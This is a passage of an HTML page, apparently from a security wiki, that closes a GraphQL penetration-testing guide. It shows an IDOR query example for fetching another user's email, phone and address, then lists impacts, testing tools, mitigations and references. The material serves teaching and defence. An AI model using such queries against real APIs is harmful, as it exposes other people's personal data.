+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">profile</span>(<span style="color:#a6e22e">userId</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;101&#34;</span>) { <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">change</span> <span style="color:#a6e22e">userID</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">fetch</span> <span style="color:#a6e22e">another</span> <span style="color:#a6e22e">user</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">data</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">username</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">email</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">phone</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">address</span>
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><hr>
+<h2 id="impacts">
+  Impacts
+  <a class="anchor" href="#impacts">#</a>
+</h2>
+<ul>
+<li>Bypass authentication or authorization checks by manipulating GraphQL queries or mutations.</li>
+<li>Gain unauthorized access to sensitive data exposed through the GraphQL schema.</li>
+<li>Extract confidential information such as user profiles, emails, API keys, tokens, or internal system details.</li>
+<li>Perform <strong>schema introspection</strong> to discover hidden queries, mutations, and internal API structures.</li>
+<li>Enumerate valid users, IDs, or resources through predictable query patterns.</li>
+<li>Abuse nested queries to retrieve excessive amounts of data in a single request.</li>
+<li>Escalate privileges by modifying parameters in mutations or accessing restricted fields.</li>
+<li>Execute deeply nested or recursive queries that overload the server.</li>
+<li>Cause <strong>Denial of Service (DoS)</strong> through expensive queries, batching attacks, or large query depth.</li>
+<li>Access fields that should be restricted due to <strong>broken access control</strong> or improper resolver validation.</li>
+<li>Perform <strong>batching attacks</strong> to test multiple credentials or IDs within a single request.</li>
+<li>Abuse poorly implemented input validation in mutations to manipulate application logic.</li>
+</ul>
+<hr>
+<h2 id="tools">
+  Tools
+  <a class="anchor" href="#tools">#</a>
+</h2>
+<ul>
+<li>graphw00f: <a href="https://github.com/dolevf/graphw00f" target="_blank" rel="noreferrer noopener nofollow">https://github.com/dolevf/graphw00f</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li>graphql-voyager: <a href="https://github.com/graphql-kit/graphql-voyager" target="_blank" rel="noreferrer noopener nofollow">https://github.com/graphql-kit/graphql-voyager</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li>GraphQL-Cop: <a href="https://github.com/dolevf/graphql-cop" target="_blank" rel="noreferrer noopener nofollow">https://github.com/dolevf/graphql-cop</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li>InQL: <a href="https://github.com/doyensec/inql" target="_blank" rel="noreferrer noopener nofollow">https://github.com/doyensec/inql</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+<li>Clairvoyance: <a href="https://github.com/nikitastupin/clairvoyance" target="_blank" rel="noreferrer noopener nofollow">nikitastupin/clairvoyance: Obtain GraphQL API schema even if the introspection is disabled</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
+</ul>
+<hr>
+<h2 id="mitigations--preventions">
+  Mitigations &amp; Preventions
+  <a class="anchor" href="#mitigations--preventions">#</a>
+</h2>
+<ul>
+<li>Disable Introspection (When Possible)</li>
+<li>Lock Down Suggestions → Disable autocomplete suggestions that can be exploited via tools like Clairvoyance.</li>
+<li>Review Schema Exposure → Never expose private fields like emails or user IDs by mistake.</li>
+<li><strong>Preventing Rate Limiting Bypass:</strong>
+<ul>
+<li>Limit query depth to avoid DoS attacks via deep nesting</li>
+<li>Set operation limits (number of fields, aliases, root operations)</li>
+<li>Implement cost analysis: score and reject overly complex queries</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="good-to-read">
+  Good To Read
+  <a class="anchor" href="#good-to-read">#</a>
+</h2>
+<p><a href="https://github.com/directus/directus/security/advisories/GHSA-7hmh-pfrp-vcx4" target="_blank" rel="noreferrer noopener nofollow">GraphQL Field Duplication Denial of Service (DoS) · Advisory · directus/directus</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<p><a href="https://hackerone.com/reports/291531" target="_blank" rel="noreferrer noopener nofollow">HackerOne | Report #291531 - Introspection query leaks sensitive graphql system information. | HackerOne</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<p><a href="https://hackerone.com/reports/885539" target="_blank" rel="noreferrer noopener nofollow">https://hackerone.com/reports/885539</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<p><a href="https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPGRAPHQL.md" target="_blank" rel="noreferrer noopener nofollow">hackerone-reports/tops_by_bug_type/TOPGRAPHQL.md at master · reddelexc/hackerone-reports</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<hr>
+<h2 id="references">
+  References
+  <a class="anchor" href="#references">#</a>
+</h2>
+<p><a href="https://medium.com/@m14r41/graphql-pentesting-a-beginners-guide-to-advanced-08c29bf82979" target="_blank" rel="noreferrer noopener nofollow">GraphQL Pentesting: A Beginner’s Guide to Advanced. | by Madhurendra Kumar | Medium</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<p><a href="https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/graphql.html" target="_blank" rel="noreferrer noopener nofollow">GraphQL - HackTricks</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<p><a href="https://graphql.github.io/graphql-over-http/draft/#sec-GET" target="_blank" rel="noreferrer noopener nofollow">GraphQL Over HTTP</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<p><a href="https://the-guild.dev/graphql/yoga-server/docs/features/request-customization" target="_blank" rel="noreferrer noopener nofollow">Request Customization | Yoga</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<p><a href="https://www.imperva.com/blog/graphql-vulnerabilities-common-attacks/#graphiQL" target="_blank" rel="noreferrer noopener nofollow">GraphQL API Vulnerabilities and Common Attacks | Imperva</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<p><a href="https://blogs.jsmon.sh/what-is-graphql-batching-attack-ways-to-exploit-examples-and-impact/" target="_blank" rel="noreferrer noopener nofollow">What is GraphQL Batching Attack? Exploits &amp; Impact</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+<p><a href="https://medium.com/@vikaskumar01/graphql-api-vulnerabilities-excessive-data-exposure-tools-for-securing-graphql-apis-24fe4fac152e" target="_blank" rel="noreferrer noopener nofollow">GraphQL API vulnerabilities, Excessive Data Exposure, Tools for Securing GraphQL APIs | by vikas kumar | Medium</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></p>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+  <div><a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/commit/d2c880c4a57b9b433287f413f6e6111ca829ffdd" title='Last modified by banditSaurabh | August 5, 2026' target="_blank" rel="noopener">
+      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
+      <span>August 5, 2026</span>
+    </a>
+  </div>
+
+
+
+  <div>
+    <a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/edit/main/content/docs/application-security/web/GraphQL.md" target="_blank" rel="noopener">
+      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
+      <span>Edit this page</span>
+    </a>
+  </div>
+
+
+</div>
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+  <div class="book-comments">
+
+</div>
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      <div class="book-toc-content">
+        
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#graphql">GraphQL</a>
+      <ul>
+        <li><a href="#fundamentals-of-graphql">Fundamentals of GraphQL</a>
+          <ul>
+            <li><a href="#finding-graphql-endpoints">Finding GraphQL Endpoints</a></li>
+          </ul>
+        </li>
+        <li><a href="#attack-surfaces">Attack Surfaces</a></li>
+        <li><a href="#exploiting-graphql-vulnerabilities">Exploiting GraphQL Vulnerabilities</a>
+          <ul>
+            <li><a href="#1-information-disclosure-attacks">1. Information Disclosure Attacks</a></li>
+            <li><a href="#2-denial-of-service-attacks">2. Denial of Service Attacks</a></li>
+            <li><a href="#3-generic-injection-attacks">3. Generic Injection Attacks</a></li>
+            <li><a href="#4-data-exposure-attacks">4. Data Exposure Attacks</a></li>
+            <li><a href="#5-over-posting-and-under-posting">5. Over-Posting and Under-Posting</a></li>
+          </ul>
+        </li>
+        <li><a href="#bypasses">Bypasses</a></li>
+        <li><a href="#advanced-attack-scenarios">Advanced Attack Scenarios</a>
+          <ul>
+            <li><a href="#1-login-brute-force-using-batch-query-attack">1. Login Brute-force using Batch Query Attack</a></li>
+            <li><a href="#2-bypassing-mfa-using-batch-query-attack">2. Bypassing MFA using Batch Query Attack</a></li>
+            <li><a href="#3-idor">3. IDOR</a></li>
+          </ul>
+        </li>
+        <li><a href="#impacts">Impacts</a></li>
+        <li><a href="#tools">Tools</a></li>
+        <li><a href="#mitigations--preventions">Mitigations &amp; Preventions</a></li>
+        <li><a href="#good-to-read">Good To Read</a></li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+ 
+      </div>
+    </aside>
+    
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
